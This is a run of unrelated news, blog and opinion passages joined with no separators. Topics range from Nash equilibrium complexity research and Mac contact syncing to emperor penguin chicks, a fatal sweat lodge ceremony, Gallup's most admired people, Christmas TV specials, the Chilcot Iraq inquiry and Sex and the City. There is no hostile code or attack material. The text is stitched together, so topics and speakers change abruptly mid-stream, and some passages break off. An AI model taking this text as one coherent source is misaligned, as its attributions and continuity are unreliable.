Anyone who ’s into computer science — or who read “ Explained : P vs. NP ” on the MIT News web site last week — will recognize the set of problems whose solutions can be verified efficiently :
It ’s the set that computer scientists call NP .
Daskalakis proved that the Nash equilibrium belongs to a subset of NP consisting of hard problems with the property that a solution to one can be adapted to solve all the others .
( The cognoscenti will infer that it ’s the set called NP - complete ; but the fact that the Nash equilibrium always exists disqualifies it from NP - completeness .
In fact , it belongs to a different set , called PPAD - complete . )
That result “ is one of the biggest yet in the roughly 10 - year - old field of algorithmic game theory , ” says Tim Roughgarden , an assistant professor of computer science at Stanford University .
It “ formalizes the suspicion that the Nash equilibrium is not likely to be an accurate predictor of rational behavior in all strategic environments . ” Given the Nash equilibrium ’s unreliability , says Daskalakis , “ there are three routes that one can go .
One is to say , We know that there exist games that are hard , but maybe most of them are not hard . ”
In that case , Daskalakis says , “ you can seek to identify classes of games that are easy , that are tractable .
” The second route , Daskalakis says , is to find mathematical models other than Nash equilibria to characterize markets — models that describe transition states on the way to equilibrium , for example , or other types of equilibria that are n’t so hard to calculate .
Finally , he says , it may be that where the Nash equilibrium is hard to calculate , some approximation of it — where the players ’ strategies are almost the best responses to their opponents ’ strategies — might not be .
In those cases , the approximate equilibrium could turn out to describe the behavior of real - world systems .
As for which of these three routes Daskalakis has chosen , “ I ’m pursuing all three , ” he says .
You can easily sync your Mac Contact list or Address Book contacts with your Google Contacts .
This is quite easy to set up , we ’ll show you how to do so in all versions of OS X .
First we ’ll cover new versions of OS X with the Contacts app , new versions of OS X automate this process quite well making it remarkably simple .
How to Sync Mac Contacts App with Google Contacts in OS X
Open the Contacts app in OS X and go to the “ File ” menu followed by “ Preferences ” Choose the ‘ Accounts ’ tab and click on the + plus button Choose ‘ Google ’ and enter your Google account login information , complete the setup process and choose to sync the contact information with Google
This is the same for all modern versions of OS X , including Yosemite , Mavericks , Mountain Lion , Lion , anything where the contacts app is labeled as “ Contacts ” .
The Google - to - Mac sync ability is available in earlier versions of OS X however too , it ’s just slightly different to setup and a bit less automated .
Syncing Mac Address Book with Google Contacts in OS X Snow Leopard
* Launch Address Book
* Click on the “ Address Book ” menu and select “ Preferences ”
* Click on the “ Accounts ” tab
* Select the “ On My Mac ” under the left accounts
* Check the checkbox accompanying “ Synchronize with Google ”
* Click on “ Configure … ”
* Enter your Google Account login , click “ OK ”
* Then click “ Sync Now ” from the menubar
* Now your Address Book is synchronized with your Google contacts !
This latter walkthrough is set within Mac OS X 10.6 Snow Leopard but the ability to sync Google contacts with Address Book is within 10.5 as well ( users have mixed results , I do n’t have Leopard 10.5 so I am unable to help much ) .
Syncing makes everyones life easier .
Your Gmail contacts will now be the same as what is on your iPhone , Mail.app , and anything else that uses the Mac Address Book !
Update :
If you ’re having troubles with older versions of OS X , one of our helpful readers , Steve Guttbinder , suggests the following :
This process uses iSync to synchronize .
You need to manually hit sync from the menu bar OR use iSync .
The menu bar icon is the SAME as the MobileMe sync icon ( since that uses iSync as well ) .
If you do not manually hit sync , it will NOT DO ANYTHING , you merely just set it up .
Thanks for the tip Steve !
Let us know in the comments if you have any questions or comments regarding syncing your contacts between Google and Mac OS X !
On May 5 , 2014 , Amazon unveiled a partnership with Twitter .
Twitter users can link their accounts to an Amazon account and automatically add items to their shopping carts by responding to any tweet with an Amazon product link bearing the hashtag # AmazonCart .
This allows customers to never leave their Twitter feed and the product is waiting for them when they go to the Amazon website . [ 146 ]
But one of the biggest differences between Cyber Monday and Black Friday remains : the style of shopping , says Vice President of PR and Events at Slickdeals , Regina Conway .
“ For example , we see more sitewide discounts or category - wide discounts on Cyber Monday , whereas Black Friday will often have very specific products such as electronics and home goods at deep , deep discounts , ” she says .
“ However , more merchants have started advertising specific product deals on Cyber Monday and vice versa , so the holidays are starting to have more crossover . ”
The infomercial industry is huge and is worth a staggering $ 250 billion as of 2015 .
It all started back in the late 40’s and early 50’s when major sponsors of serial television programs were soap manufacturers ( i.e. Proctor & Gamble , Lever Brothers and Colgate - Palmolive ) , which is how “ soap operas ” got their name .
There is some controversy although the first infomercial is thought to have been for a blender either made by VitaMix or Waring Blenders and aired in 1949 or 1950 .
Time limits for commercials were imposed by the Federal Communications Commission ( FCC ) not too long after this which halted the growth of infomercials until 1984 when those limits were removed .
Shami Chakrabarti , director of Liberty , said : " Yet again it takes a senior judge to point out what most people already know - if the Government is going to lock you up , it needs to tell you why .
( Pocket - lint ) - We 've seen a couple of reports on message boards that seem to indicate that the iconic Technics SL - 1200 and SL - 1210s may be about to be discontinued .
If true , it would be a surprise , as both models represent iconic turntables and are widely considered the industry standard in nightclubs .
The rumours appear to originate from a New Zealand DJ shop called DMC World , which says on its product page : " Panasonic ( the manufacturer of Technics ) have announced that production of the world famous Technics SL - 1200 and SL - 1210 DJ turntables will stop at the end of February 2010 " .
The turntables have been around for more than 35 years , and are featured in the London museum of Science and Technology as an important step in how music has been played and presented over the last century .
Their popularity has ensued due to their tank - like construction , high torque and effective insulation from acoustic feedback .
Another DJ shop - storedj.com.au - reportedly told recipients of its email newsletter : " You hear parents talking about where they were when they heard that JFK was shot , or that man landed on the Moon .
For DJs , this news will come with similar surprise .
The gracious founder and mother of all DJ equipment , the Technics SL - 1200 is being put to bed and will no longer be produced " .
And an Australian dance music website , inthemix.com.au , has a quote from a Panasonic spokesman - Ian North - who says : " It is a sad day today but due to low sales globally in analogue turntables a decision to stop production has been made on Technics Turntables .
For Australia this means we will receive our last shipment in March " .
There 's a few question marks over this story - " Why ? " is the biggest .
Even though DJs are increasingly shifting to CD players and computers to mix on , the 1200s always appear highly on DJ shops ' best - seller lists thanks to their reputation , and despite their sky - high price .
Also , the rumour appears to come exclusively from down under , so the withdrawal could be limited to the Antipodes .
We 've contacted Panasonic 's press office for clarification about what 's going on , and we 'll update this post when we hear more .
UPDATE : Panasonic has come back to us with a statement , but it unfortunately does n't yet say much .

Sleeping beauties : P - p- p- picture perfect penguin chicks take a break on the ice
Advertisement
It 's a hard life being a penguin chick .
Born into an icy world where temperatures plunge to - 40C with wind speeds up to 89 mph , the youngsters must fend off predatory giant petrels from the air and leopard seals in the sea .
Perhaps that is why these three are so exhausted .
They belong to a colony near Snow Hill Island along the Antarctic Peninsula , which was first visited by humans only five years ago .
' It was common to see several chicks huddled together dozing off , one using the flipper of another for a head - rest or a flipper lying across the head of its uncaring neighbour '
American wildlife photographer David C Schultz captured the intimate portrait of a penguin nursery or rookery during a trip to the region .
' It looks chaotic when you approach the rookeries .
Then you start to spot small groups of chicks huddled together trying to stay awake , ' he told the Mail Online .
' They are comical even when they 're sleeping .
I often saw chicks dozing off , one using the flipper of another for a head - rest or laying a flipper across the head of an uncaring neighbour . '
Mr Schultz , 53 , added : ' There was constant noise at the site as well , with chicks calling out for attention for another meal . '
Emperor penguins are a particularly noisy bunch as the species has no fixed nest sites .
Therefore the penguins rely on their voices to locate their families on the ice and have the widest range of calls of any penguin species .
Emperor Penguins chicks must call to their parents for food as they do n't have set nest locations .
The species is incredibly curious and will approach visiting humans
The birds are so unused to humans that they react with simple curiosity when scientists or photographers approach them .
' On numerous occasions I ’d be sitting a distance away from the rookery and a brave chick of the crèche would start to venture my way , followed shortly afterwards by the rest of the gang , ' Mr Schultz said .
' I left one of my cameras set up on a tripod and backed away as they approached me , just to see what would happen .
The result was no gear being damaged and several very funny images as they tried to work out what it was . '
Who 's he ?
The Emperor Penguins were not bothered by photographers in their midst , David Schultz said .
Mr Schultz also witnessed touching scenes of family life during his visit at the end of October .
Emperor penguins remain faithful to their breeding partner following courtship in the spring , although they often change partners from one year to the next .
' When I visited the chicks were about three months old and are being watched after by either the male or female adult , sometimes both , ' he said .
' The female lays a single egg and hands it over to the male .
He cradles the egg on his feet until it hatches about nine weeks later .
Meanwhile the female makes the long trek back to the open sea to feed so she can bring back the chick ’s first meal .
' It ’s a bit late to see chicks still tucked away under the adults brood pouch , but we did spot a few .
' The parents are very protective of their chick and I did see several thwarted attempts of an adult trying to steal a chick away from its parent .
They will do this if their chick has died or if the egg never hatches . '
Chicks begin moulting into juvenile plumage from early November , which takes up to two months and is often not completed by the time they leave the colony .
All the birds make the considerably shorter trek to the sea in December or January and spend the rest of the summer feeding there .
Mr Schultz captured intimate family moments when visiting the hardy birds .
Adult pairs will raise just one chick a year
Mr Schultz joined an expedition on board a Russian icebreaker to reach the wonderful creatures .
The team travelled by boat and helicopter followed by a two - mile hike across the sea ice .
But the photographer said the trip was undoubtedly worth it .
' Along with the dramatic landscape , with mountains towering straight out of the ocean , you find yourself surrounded by wildlife .
' The feather patterns on the adults make for wonderful detail shots and when they puff out their chest and let out a call , heads stretched skyward , the sunlight just glows off their shiny coats . '
Despite having plenty of subjects to choose from , setting up a perfect shot could take some work .
Happy feet : Baby penguins follow Mr Schultz as he tries to set up his ' perfect shot '
' Early one day I spotted a beautifully curved hole in an iceberg which had been frozen in place for the winter , ' Mr Schultz said .
' I thought later in the day when there was better light it could be used to frame a group of penguin chicks
' So I sat on the ice by the nearby rookery and waited .
It did n’t take long for several penguins , mostly chicks , to approach me .
As they drew closer I slowly backed away , leading the penguins towards the spot I had selected .
' It took more than an hour and in the end I had about forty penguins following me to the iceberg .
' I stood and quickly moved around to the other side of the berg only to find that there were way too many birds now to make a nicely composed image .
So I waited .
Slowly they began to disperse until a single adult remained at which time I got one of my favorite images from the entire trip . '
David Schultz ( right ) spent a day setting up his favourite shot of the expedition through a hole in the ice ( left )
This world of ice is far away from the gallery Mr Schultz runs among the desert plains of Utah .
The photographer said he wanted to travel the world from the age of 13 after he was diagnosed with juvenile diabetes .
He was advised against a career that would make him dependent on his eyesight but this just made him determined to see as much of the world as he could .
His particular interest in Antarctica was piqued after reading about Sir Ernest Shackleton 's 1914 expedition aboard the ship Endurance .
' The story was of course incredible , ' he said .
' But for me the photographs that Frank Hurley returns with was what got me hooked . '
The latest expedition was Mr Schultz 's fourth to the isolated continent and he hopes to return to this magical world one day soon .
Yesterday ’s Tea Party on Capitol Hill drew thousands of protesters from across the country .
But how many exactly ?
Depends who you ask .
MSNBC reported yesterday that a Capitol policeman said there were 3,000 to 3,500 people there .
Our reporters on the scene estimated the crowd size at no more than 8,000 or so .
Rep. Michele Bachmann ( R - MN ) , on the other hand , says 25,000 to 45,000 .
Rep. Tom Price ( R - GA ) offered a similar estimate .
And G. Gordon Liddy ’s radio show producer implied it was more than a million .
TPMDC ’s Eric Kleefeld has the story .
SEDONA , Ariz . 
Midway through a two - hour sweat lodge ceremony intended to be a rebirthing experience , participants say , some people began to fall desperately ill from the heat , even as their leader , James Arthur Ray , a nationally known New Age guru , urged them to press on .
“ There were people throwing up everywhere , ” said Dr. Beverley Bunn , 43 , an orthodontist from Texas , who said she struggled to remain conscious in the sweat lodge , a makeshift structure covered with blankets and plastic and heated with fiery rocks .
Dr. Bunn said Mr. Ray told the more than 50 people jammed into the small structure  people who had just completed a 36 - hour “ vision quest ” in which they fasted alone in the desert  that vomiting “ was good for you , that you are purging what your body does n’t want , what it does n’t need . ”
But by the end of the ordeal on Oct. 8 , emergency crews had taken 21 people to hospitals .
Three have since died .
Mr. Ray , who calls himself a teacher of “ practical mysticism ” and has gained widespread exposure through writings and an appearance on “ The Oprah Winfrey Show , ” has come under intense scrutiny in the New Age movement that is a cottage industry here .
The Yavapai County sheriff , Steve Waugh , has opened a homicide investigation , but Mr. Ray has not been charged .
From the WaPo : Kucinich panel to investigate Citigroup tax ruling
House subcommittee said Thursday that it will investigate the Treasury Department 's decision to change a long - standing law so that Citigroup could keep billions of dollars in tax breaks .
...
The Internal Revenue Service ... ruled last Friday that Citigroup could keep $ 38 billion in tax breaks that otherwise would decline in value as the government sells its stake in the company .
Federal law lets companies shelter profits from taxes in good years based on the amount of losses in previous bad years .
But the law restricts the use of past losses if a company changes hands , to discourage profitable companies from buying unprofitable firms to avoid paying taxes .
Treasury 's plan to sell its $ 25 billion stake in Citigroup would have qualified as a change of ownership under the law .
...
Treasury officials said the government needed to grant the tax break in order to sell its shares in Citigroup because the company could not afford the loss .
Officials also said that preserving the tax break would help the government sell its shares at a higher price .
The key question is who benefits from the law change ?
The value of the shares the U.S. owns should increase , but only 34 % of the share price increase accrues to U.S. taxpayers
The other current shareholders receive the rest .
Of course the U.S. delayed selling shares because of the weak Citi share price ( Treasury would have had to sell at a loss ) , but this is still an issue when Treasury eventually sells .
PRINCETON , NJ -- Secretary of State Hillary Clinton continues her reign as the Most Admired Woman in the eyes of Americans , but barely edges out former Alaska Gov. Sarah Palin this year , 16 % to 15 % .
Talk show host Oprah Winfrey and first lady Michelle Obama finish third and fourth , with former Secretary of State Condoleezza Rice , Queen Elizabeth II , former British Prime Minister Margaret Thatcher , and poet Maya Angelou -- all regulars on the list -- joined by newcomers German Chancellor Angela Merkel and Elin Woods in the top 10 .
Hillary Clinton has now been named Most Admired Woman 14 times since 1993 , spanning her career as first lady , New York senator , and now secretary of state .
The three times she has not finished first during this time , she earned second place ( to Laura Bush in 2001 and to Mother Teresa in 1995 and 1996 ) .
" Since 1948 , Billy Graham and Queen Elizabeth II have been the two individuals with the most top 10 finishes on the Most Admired Man and Woman lists , with Graham doing so a record 53 times and the British monarch achieving that distinction 42 times . "
President Barack Obama is the landslide winner among men for the second time , with 30 % of Americans naming him as the Most Admired Man this year .
Obama won last year with 32 % , and both totals are among the highest Gallup has measured for a winner , with George W. Bush 's 39 % in 2001 remaining the all - time high for Most Admired Man .
Obama 's similar performance to last year 's is notable considering the declines in his approval and personal favorability ratings since he took office in January .
Bush finished second again this year , after winning the honor from 2001 - 2007 .
The rest of the top 10 includes former South African President Nelson Mandela , radio and TV personality Glenn Beck , Pope Benedict XVI , the Rev. Billy Graham , Microsoft founder Bill Gates , Arizona Sen . John McCain , former Presidents George H.W. Bush and Bill Clinton , and golfer Tiger Woods .
Ironically , Woods -- who has some of the highest personal favorability ratings in Gallup polling history -- did not finish in the top 10 until this year , following a personal scandal that caused those ratings to plummet .
Americans ' choices for Most Admired Man and Woman are influenced by their political leanings .
Obama easily wins as Most Admired Man among Democrats and independents , but among Republicans George W. Bush ranks first , with Obama placing second .
The choices for Most Admired Woman are polarized by party , with Hillary Clinton the dominant leader among Democrats and Sarah Palin among Republicans .
The two receive the same percentage of mentions from independents .
Clinton still ranks among the leaders among Republicans , while Palin barely registers any mentions from Democrats .
Graham , Queen Elizabeth II Extend Streaks
Gallup first asked Americans to name , without prompting , which living person they admire most in 1946 , with Gen. Douglas MacArthur winning that year .
Starting in 1948 , Gallup asked separate questions to identify the Most Admired Man and Woman .
Since 1948 , Billy Graham and Queen Elizabeth II have been the two individuals with the most top 10 finishes on the Most Admired Man and Woman lists , with Graham doing so a record 53 times and the British monarch achieving that distinction 42 times .
Their long histories on the most admired lists are a result of their gaining notoriety at a relatively young age and living a long life .
In fact , Graham was first mentioned in the top 10 in 1955 , when he was in his thirties .
He has finished in the top 10 every year since 1963 ( except 1976 when the question was not asked ) , and all but one year since 1955 .
Queen Elizabeth II has not been as regular a top 10 finisher as Graham -- appearing five times this decade -- but has a longer history of ranking among the most admired , first appearing in 1948 ( as Princess Elizabeth ) .
In addition to Graham and Queen Elizabeth II , this year George H.W. Bush , Bill Clinton , and Nelson Mandela added another top 10 finish as Most Admired Man to their resumes , as did Margaret Thatcher , Oprah Winfrey and Hillary Clinton for Most Admired Woman .
Thatcher has the longest current streak of top 10 finishes among women at 31 , appearing every year since 1979 .
The accompanying table shows the number of top 10 finishes for Most Admired Man and Woman historically .

Planning for public transport improvements will continue despite anticipated cuts in tomorrow 's Budget , Minister for Transport Noel Dempsey insisted this afternoon .
Speaking at the launch of the Luas Red Line extension to the Point , Mr Dempsey joked he was glad the opening was happening " this side of the Budget " , instead of after it .
Responding to questions from reporters later , Mr Dempsey reaffirmed the Government 's commitment to developing Metro North , Dart underground and the remaining Luas lines .
Mr Dempsey said he could give “ absolute assurance ” that planning on Metro North and Dart underground would go ahead .
“ Both of them are in the capital programme going forward .
They have to go through the planning process and the Government is absolutely committed to both of those projects " .
Mr Dempsey said : " There are a couple of more Luas extensions that will open over the next couple of years and further ones that are in planning .
We intend to ensure that we can bring all of those through planning and design and then we will build as we have the money to build . "
Lines due to open next year and in 2011 are the Cherrywood extension and the extension to City West .
However , the Minister conceded that it would not be possible to complete planned rail lines would within the original Transport 21 timeframe .
“ It will be built , it will be planned for and as soon as we have the finance it will be built " .
To celebrate the new Luas extension , travel between Tallaght and the point is free for the remainder of today .
The extension from Busáras to the Point will incorporate four stops at Georges Dock , Mayor Square , Spencer Dock and The Point .
The project extends the Red Line for 1.5 km from Connolly Station , through the Docklands to the Point .
Total journey time on the Red Line from the Point to Tallaght will be 52 minutes and trams will run from the Point to Tallaght every 6.5 minutes at peak times and every eight minutes at all other times on weekdays .
Mr Dempsey said the extension would add 1.8 million passenger journeys to the network every year .
The new line will go into full service tomorrow morning at 5.30 am .
RPA chief executive Frank Allen said that while many people in the IFSC had misgivings about building a light rail through the heart of a financial services centre , these concerns were well managed .
Public consultation for the extension began in January 2001 and construction began in June 2007 , he said .
Today we ’re delving into the classic TV Holiday favorites that hit the air right about December 1st and do n’t stop repeating themselves till Christmas Day .
These ten classic television programs were made specifically for the season , they ooze Yule and coat us all in their warm , Christmasy glow .
So , sit back with a nice hot toddy or some kind of nog and enjoy the wonderment .
10 ) Mickey ’s Christmas Carol – 1983
Take the beloved literary classic , Dickens ’ ‘ A Christmas Carol ’ , and get it all Disn- ified , with a heaping handful of Scrooge McDuck as , well , Scrooge , and just about every animated character in Disney history - plus the inclusion of a very faithful adaptation - and you get this annual Holiday classic .
Quote :
Belle : Ebeneezer ?
Scrooge : Yes , Isabelle ?
Belle :
My eyes are closed , my lips are puckered , and I ’m standing under the mistletoe .
Scrooge :
You ’re also standing on my foot .
9 ) A Muppet Family Christmas – 1987
Jim Henson was absolutely a genius in his own right , and he passed on far to soon .
What he left was a legacy of the Muppets ; Kermit , Piggy , Fozzy , The Fraggles , Yoda , The Dark Crystal … it ’s all just something so amazing .
Here we have a very sweet , very funny family reunion of sorts featuring all of the Christmas song favorites coupled with that classic Muppet slap - stick .
Quote :
Turkey :
Where ’s my room ?
Gonzo :
If you ’re not careful , it ’ll be in the oven .
See you at dinner .
8 ) Emmet Otter ’s Jug Band Christmas – ’ 77
Though this was originally released in 1977 , it was a special I grew up with and was aired throughout the holiday on HBO during its early days .
Yes , it ’s another Henson Masterpiece , but it just had to have a spot of its own as it ’s such a treasure and such a great story .
It ’s so simple as we watch Emmit and his mom , Alice , wonder aloud how they ’re going to make each other ’s Christmas special , and all it takes is a little heart - felt music .
* SOB !*

Wendel : Golly !
You got mashed potatoes ?
7 ) Santa Claus is Comin ’ to Town – 1970
From here on out , Rankin Bass pretty much has a strangle hold on the classics , and that ’s just fine with me .
In this awesome piece of Holiday majesty we find a young Santa not quite ready to accept his duties .
But , with a little help and a bunch of really cool RB - style stop motion animation , all is well at the end .
Quote :
Jessica :
If the Burgermeister saw you , we would all be in real danger !
Kris Kringle :
In danger from toys ?
6 ) Frosty the Snowman – 1969
Oh look !
It ’s those fine folks at Rankin Bass yet again !
This one , however , is fully animated and includes an awesome rendition of Jimmy Durante to boot !
We all know the story , but even the classic song does n’t include a moronic and twisted magician !
Well , this toon certainly does !
Quote :
Santa Claus :
Now you go home and write “ I am very sorry for what I did to Frosty ” a hundred zillion times .
And then maybe – just maybe , mind you – you ’ll find something in your stocking tomorrow morning .
5 ) ‘ Twas The Night Before Christmas – 1974
Based quite loosely on Clement Moore ’s timeless story , in this - guess what - Rankin Bass cartoon , we find a family of mice living in the home of the town clockmaker who is commissioned to make an enormous clock to chime in Santa .
Well , thanks to one disbelieving mouse , the clock ends up broken and only by the joy of the Holiday does all work out well in the end .
Quote :
Father Mouse : Albert .
Albert : Yes , Father .
Father Mouse :
We need to talk .
Albert : I said , “ Yes , Father ” .
Father Mouse : “ Yes , Father ” , what ?
Albert : I wrote the letter .
My friends and I , that is .
“ All of us ” .
4 ) The Year Without Santa Claus – 1974
Wait , is this …
Yes !
RANKIN BASS !
HA !
Well , like I said , I could care less of their monopoly on the great holiday shows , and this just proves my point .
Santa , voiced by Mickey Rooney , is losing his faith .
All it takes is the quick thinking of a few elves , a little reindeer , and Mrs Claus , and those wacky Miser Brothers to make this easily one of the best specials of all time .
Quote :
Santa Claus :
All right .
What are you up to ?
Mrs. Santa :
Up to ?
Do I look like I ’m up to something ?
Santa Claus :
No , you do n’t look like you ’re up to something , but whenever you look like you ’re not up to ANYTHING , you ’re up to something .
3 ) How the Grinch Stole Christmas – 1966
Gather up a whole bunch of Dr. Seuss , Chuck Jones , voices by Boris Karloff and Thurl Ravenscroft ( also Tony the Tiger ) , and you ’ve got a mess of an amazing Christmas Special .
Just the song alone is worth the price of admission , not to mention the wonderful animation by the Looney Tunes alum .
Outstanding .
Quote :
Grinch : Pooh - pooh to the Whos !
Narrator : …he was grinchily humming .
Grinch :
They ’re finding out now that no Christmas is coming !
They ’re just waking up , I know just what they ’ll do .
Their mouths will hang open a minute or two , then the Whos down in Whoville will all cry , “ Boo Hoo . ”
2 ) Rudolph the Red Nosed Reindeer – 1964
And the final entry in our Rankin Bass catalog ( trust me , there are many more that did n’t make the list ) , we have the always loved , yearly classical , nearly feature - length gift : Rudolph .
Yes , from the Snow Man Burl Ives to the Peppermint - prospecting Yukon Cornelius , this show is something not to be missed .
Quote :
Head Elf :
Why were n’t you at elf practice ?
Hermey : Just fixing these dolls ’ teeth .
Head Elf : Just fixing …?
Now listen , we have dolls that cry , talk , walk , blink and run a temperature .
We do n’t need any chewing dolls !
Hermey : But I just thought I ’d find a way to – to fit in .
Head Elf :
You ’ll never fit in !
Now you come to elf practice , learn how to wiggle your ears , chuckle warmly , go hee - hee and ho -ho , and important stuff like that .
A dentist !
Good grief !
1 ) A Charlie Brown Christmas – 1965
What can possibly be said about perhaps the most beloved Christmas of all time .
I always knew , as a child , that Christmas morning was just around the corner when the Peanuts gang was on TV .
Charlie Brown made interim play director , Lucy and Schroeder arguing over Christmas music , and Linus ’ reading of the Story from the Bible … just so beautiful .
I ca n’t wait to watch it .
Quote :
Charlie Brown :
Thanks for the Christmas card you sent me , Violet .
Violet : I did n’t send you a Christmas card , Charlie Brown .
Charlie Brown :
Do n’t you know sarcasm when you hear it ?
The following correction was printed in the Guardian 's Corrections and clarifications column , Monday 7 December 2009
This comment piece said that every member of the cabinet apart from Robin Cook and Clare Short signed up to the Iraq war .
Clare Short was indeed a public critic of the preparations for war but on 18 March 2003 she voted for a motion that the government " should use all means necessary to ensure the disarmament of Iraq 's weapons of mass destruction " .
The invasion of Iraq began on 20 March
Hurrah .
It 's Colosseum time again .
The all - singing , all - dancing Chilcot inquiry into the Iraq war is in town at the QE2 centre , with ministers tossed to lions , spies eaten by bears and spin doctors hacked by muscle - bound gladiators .
Britain 's political community , bored at having to wait six months for an election , is baying for blood .
The nation may lack bread , but at least it can have a circus .
It even has a star Christian , Tony Blair , who got us into the mess .
The cry is for him to die , and die horribly .
The camera must toy with his face in the dock , zooming in on the dripping brow , the writhing body language , the phoney meekness and the mendacity .
Damned as a war criminal , Blair must be hung , drawn and quartered and his head impaled on a spike at Temple Bar .
He must be Chamberlain after Munich , Eden after Suez .
There must be nothing left of him but a puddle of sweat .
The same goes for the rest of them , Gordon Brown , the cabinet , John Scarlett , Alastair Campbell , civil servants , generals , bag carriers and tea ladies .
Kill them all .
The amphitheatre is packed with MPs and journalists , salivating as the gore runs into the sand .
Not Nero in all his pomp staged a show like this one .
What else is Chilcot about ?
We know the truth .
The report can be written in a sentence .
Tony Blair went to war in Iraq because he lacked the guts to stand up to George Bush , say the invasion was not justified by facts or law , and refuse to join him in Baghdad .
Despite being told to his face by Hans Blix that there were no weapons of mass destruction in Iraq , he deceived the cabinet and parliament and took his nation to war .
We know this from a dozen books and papers , from leaks and reports , from freedom of information requests and memoirs .
Chilcot might dot an i and cross a t .
He might reveal a memo or confirm a date .
But to what end ?
We have been told how Blair took the decision by sofa government , twisting , dodging and distorting the constitution to get it through .
We know how Downing Street crafted documents to scare the public into believing that the nation 's security was under threat .
We know that the army was left without equipment or planning .
All this we know .
There have been two independent inquiries into the preliminaries of the Iraq war .
Both Hutton and Butler in 2004 supplied mountains of material .
Both were staged as show trials , but both correctly interpreted their remit as to ascertain facts and put them in the public domain .
The fault of both was to proffer half - hearted conclusions as to who might , or might not , be to blame .
That had the audience howling whitewash .
The Chilcot inquiry was set up in response to that criticism , but it can no more deliver accountability than could its predecessors .
An inquiry is not a default mode of democracy .
As Sir John Chilcot said yesterday , his is not a court of law and " no one is on trial " .
Indeed , yesterday 's session suggested an academic seminar on the topic of paint drying .
Yet a trial is what the public appears to want : indeed , a trial , a verdict , a sentence and an execution .
It clamours not for facts but for retribution for the Iraq war .
It wants not a smoking gun but body parts .
This is a clear and unsatisfactory clash of expectations .
An inquiry is not public accountability but a substitute for it .
The setting up of Chilcot was not British politics acknowledging responsibility for the Iraq war , but abdicating responsibility .
The war may have been peculiarly Blair 's in that he personally oversaw the preamble to it and took upon himself the burden of selling it to the electorate .
But parliament and the wider political community cannot be detached from blame and thus exonerated .
With the exception of the then foreign secretary , Robin Cook , and the development secretary , Clare Short , every member of the cabinet signed up to the war and most MPs voted for it .
They did so in defiance of what Cook , who knew the state of the intelligence , told them .
They did so knowing that the attorney general 's advice had smudges all over it and knowing that the weapons of mass destruction dossiers were " dodgy " .
Blair was no fool .
He made sure that the House of Commons debated and voted for Iraq , and it did .
Parliament may now bay for Blair 's blood , but it approved the war and its various select committees never once voiced dissent .
It did so because Labour MPs were frightened for their jobs and wished to keep in with Blair , and because Tory MPs never oppose wars .
Most of the media agreed with them , even after 2 million Britons marched through London opposing the invasion .
The political community ultimately bought into Blair 's war .
Only now does it talk about " the lies that led us into Iraq " and seek to hold others responsible .
Going to war is a democratic assembly 's most serious decision .
It must account for it .
Parliament must explain to the public why it supported Blair and his government in the spring of 2003 .
If they now consider themselves mistaken , even if they were misled , MPs cannot push responsibility on to a stage army of judges , civil servants and historians .
They must debate the matter and reach the appropriate conclusion .
If parliament decides that the cabinet collectively was to blame – as surely it must – then it should demand resignations .
If it finds itself to blame , it should dissolve and submit itself to the judgment of the electorate , rather than outrageously telling Chilcot not to report until after next year 's election .
Suppose Chilcot were to name and blame specific ministers and public servants and call for their impeachment as deceivers or even as war criminals .
What does parliament do ?
There has been no formal trial or even parliamentary hearing .
Do MPs call in the director of public prosecutions ?
Suppose Chilcot blames parliament , as he should .
Does it again dissolve itself ?
The answer is that it will do none of these things .
Chilcot is performing an exercise in historical research .
Parliament will do absolutely nothing with his report , as it is doing nothing about Blair 's other war in Afghanistan , even when there is still time to stop more unnecessary bloodletting .
To MPs Chilcot is merely a convenience for getting themselves off the hook .
It is to this that democratic accountability is reduced : long periods of silent inertia interrupted by occasional spurts of blood .
She 's not a brass - knuckled political figure , a Birkenstock - wearing Amazon or a breaker of corporate glass ceilings ; she 's just a sassy single girl in New York City .
So why am I so sure that Carrie Bradshaw – the charming , ever - hopeful star of the longrunning HBO series and hit film , all based on Candace Bushnell 's New York Observer column – is an icon and did as much to shift the culture around certain women 's issues as real - life feminist groundbreakers ?
I have written before about how radical it was that the narrative of Sex and the City centred not around a couple – let alone the traditional formula of hero - plus - beautiful - secondary - love - interest .
Rather , the core of the tale was always the life - sustaining friendship among four women , as the men in their lives came and went .
This break from narrative norms was remarkable not just because Bushnell was insisting that four women – no longer in their first youth – were renewably compelling on their own terms ; it was also radical because , in a very un - PC but admirable flouting of feminist norms , Bushnell was brave enough to lay bare the secret – that for many women the search for love is the same urgent , central , archetypal quest story that for men is played out in war narratives and adventure tales .
Bushnell was gutsy enough to disclose that even we serious , accomplished , feminist women spend a lot of time , when we are alone with our female friends , telling stories centred on the men with whom we are romantically entangled , exploring the quality of the love and attraction , the romance and the sex .
And we are often just that graphic and hopeful and vulnerable and slutty as those four characters .
This was so startlingly un-sayable that when women watched Sex and the City , it was like seeing a secret set of their own dramas spring into art .
Now they are the stalest of cliches , but when , in the first 1998 episode , in the midst of all that big hair and weird brown lipstick , you hear Carrie first describe the allure and disappointment of " toxic bachelors " , when Samantha first says frankly that she likes to have sex without emotion , to " fuck like a man " , it was bitingly fresh for women to speak these aphorisms out loud , in public , and in fabulous heels .
But there are other reasons that the characters of Sex and the City endured as icons throughout the first decade of the 21st century , and other reasons that Carrie will continue to resonate .
She was a writer who arrived in the big city to test her mettle and realise her voice .
Male writers have structured stories around exactly this character from F Scott Fitzgerald to JD Salinger to Philip Roth ; but Carrie showed audiences week after week that a lively female consciousness was as interesting as female sexuality or motherhood or martyrdom – the tradition role model options .
Carrie is a writer , and her adventures are n't just love escapades as they would be for a Fanny , or even an Elizabeth Bennet : they are material filtered though one woman 's distinctive point of view and crafted into text in her unique voice .
After the shallow or deeper sagas of hot sex or social slights , of hungover breakfasts with the girls or Cosmopolitans and hookups at night , every episode saw the letters unscrolling – often forming quite existential questions – across Carrie 's computer screen .
Teenage girls watching each episode were taking in a clear message .
Not only can I dress up and flirt , seduce and consume , overcome challenges , yield to temptations , take risks , fail , try again – I can think about it all , and what I think will matter .
It may seem ironic that the first female thinker in pop culture ( not in books – books have had them since Doris Lessing ) came to us with corkscrew curls and wacky cloth flowers in her hair , teetering on Manolos worn over Japanese - schoolgirl socks .
But really , can you name a TV show or film prior to this that centred around a woman reflecting about her life and the world ?
Carrie , for better or worse , was our first pop-culture philosopher .
What about other firsts from Sex and the City that made a big difference in women 's lives , and probably , by extension , men 's lives too ?
Let 's just take a look at Samantha .
The history of English – and one might say western – culture , when it comes to female sexuality , is the history of sluts getting punished for their lust .
From the teenage non-virgins stoned to death in the Bible , to Hester Prynne and Madame Bovary , sluts always , but always , get some terrible disfiguring disease – or die .
